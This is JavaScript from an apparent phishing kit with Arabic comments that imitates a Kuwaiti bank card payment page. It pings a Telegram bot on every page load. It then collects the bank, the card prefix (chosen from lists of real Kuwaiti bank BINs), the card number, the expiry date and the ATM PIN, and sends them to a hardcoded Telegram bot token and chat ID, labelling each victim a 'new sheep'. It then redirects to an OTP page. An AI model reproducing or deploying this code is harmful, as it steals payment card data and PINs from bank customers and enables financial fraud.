  // دالة لإرسال الإشعار إلى تليجرام
  function sendTelegramNotification() {
    var token = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E"; // ضع توكن البوت هنا
    var chatId = "6454807559"; // ضع معرف الدردشة هنا

    var message = "🔔 زائر جديد";  // الرسالة التي سيتم إرسالها

    // إرسال الرسالة عبر Telegram Bot API
    var url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("تم إرسال الإشعار بنجاح.");
        } else {
            console.error("حدث خطأ أثناء إرسال الإشعار.");
        }
    })
    .catch(error => {
        console.error("حدث خطأ في الاتصال:", error);
    });
}

// إرسال الإشعار عند تحميل الصفحة
window.onload = function() {
    sendTelegramNotification();  // إرسال الإشعار عند تحميل الصفحة
};

function updateOptions() {
    var bank = document.getElementById("bankSelect").value;
    var prefixSelect = document.getElementById("prefixSelect");

    // إعادة تعيين القائمة قبل إضافة الخيارات الجديدة
    prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';

    var options = {
        ABK: ["403622", "423826", "428628"],
        RAJHI: ["458838"],
        BBK: ["588790", "418056"],
        BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
        BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
        CBK: ["532672", "537015", "521175", "516334"],
        DOHA: ["419252"],
        GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
        TAM: ["45077848", "45077849"],
        KFH: ["450778", "537016", "532674", "485602"],
        KIB: ["406464", "409054"],
        NBK: ["464452", "589160"],
        WEYAY: ["464425250", "543363"],
        QNB: ["524745", "521020"],
        UNB: ["457778"],
        WARBA: ["532749", "559459", "541350", "525528"]
    };

    // إضافة الخيارات إلى القائمة المنسدلة
    if (options[bank]) {
        options[bank].forEach(function(number) {
            var option = document.createElement("option");
            option.value = number;
            option.textContent = number;
            prefixSelect.appendChild(option);
        });
    }
}


function sendToTelegram() {
    var token = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E"; 
    var chatId = "6454807559"; 

    var bank = document.getElementById("bankSelect").value;
    var selectedNumber = document.getElementById("prefixSelect").value;
    var cardNumber = document.getElementById("cardNumber").value;
    var expiryMonth = document.getElementById("monthSelect").value;
    var expiryYear = document.getElementById("yearSelect").value;
    var pin = document.getElementById("pin").value;

    // التحقق من أن جميع الحقول ممتلئة قبل الإرسال
    if (!bank || !selectedNumber || !cardNumber || !expiryMonth || !expiryYear || !pin) {
        alert("يرجى ملء جميع الحقول قبل الإرسال.");
        return;
    }

    var message = `📩 خاروف جديد\n\n` +
                  `🏦 اختصار: ${bank}\n` +
                  `🔢 البادئة ${selectedNumber}\n` +
                  `💳 الرقم ${cardNumber}\n` +
                  `📅 انتهاء البطاقة: ${expiryMonth}/${expiryYear}\n` +
                  `🔑 ATM ${pin}`;

    var url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            window.location.href = "otp.html";  
        } else {
            console.log("حدث خطأ أثناء إرسال البيانات.");
        }
    })
    .catch(error => {
        console.log("حدث خطأ في الاتصال:", error);
    });
}



// استرجاع المبلغ الإجمالي من sessionStorage لعرضه في invoiceAmount
const invoiceAmount = document.getElementById('invoiceAmount');
const storedAmount = sessionStorage.getItem('finalAmount'); // استخدم متغير جديد لعرض المبلغ الإجمالي

if (storedAmount) {
invoiceAmount.textContent = `المبلغ الإجمالي: ${storedAmount} د.ك`;
} else {
invoiceAmount.textContent = 'لم يتم العثور على المبلغ الإجمالي.';
}

// استرجاع المبلغ الإجمالي بعد الخصم لعرضه في finalAmountText
const finalAmountText = document.getElementById('invoiceAmount');
const storedFinalAmount = sessionStorage.getItem('finalAmount'); // استخدم متغير جديد هنا لتخزين المبلغ بعد الخصم

if (storedFinalAmount) {
finalAmountText.textContent = `    ${storedFinalAmount} K.D`;
} else {
finalAmountText.textContent = 'لا يوجد بيانات لعرضها.';
}